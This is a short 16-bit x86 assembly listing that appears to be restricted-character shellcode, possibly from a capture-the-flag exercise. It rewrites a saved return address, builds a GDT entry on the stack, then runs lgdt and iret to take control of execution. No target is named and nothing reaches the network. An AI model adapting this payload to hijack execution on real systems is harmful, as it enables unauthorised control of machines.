push si

inc bx
inc bx
inc bx

;bx == 0x149a
;store off to dx as we need bx for calculating new return
push bx
pop dx

;get orig si into bx
pop bx

;store off our ret address
pop di
pop es

;adjust di ahead 0x7f bytes so we land on setting up cr0 and jumping
lea ax, [bx+di]

;swap dx around
push dx
push dx
inc sp
pop dx

;continue adjusting return, current value in ax
push ax
pop sp

;inc 14 bytes
pop ax
pop ax
pop ax
pop ax
pop ax
pop ax
pop ax
push sp
pop ax

;need to write data starting at 0x0:0x20 to 0x0:0x28
push cs
push es
inc sp
pop sp

;make ss == 0
push cs
pop ss

;sp == 0x28
;setup gdt entry for 0x20
push cs
push dx
push dx
push dx

;setup value to load, 0x00000000:0x9a14
push cs
pop sp
pop cx
pop cx
pop cx
push cs
push cs
push dx

;now set ds == ss so ldt can find the data we pushed
push ss
pop ds

lgdt [0x0]

;now setup iret
push cs
push es
push ax
iret
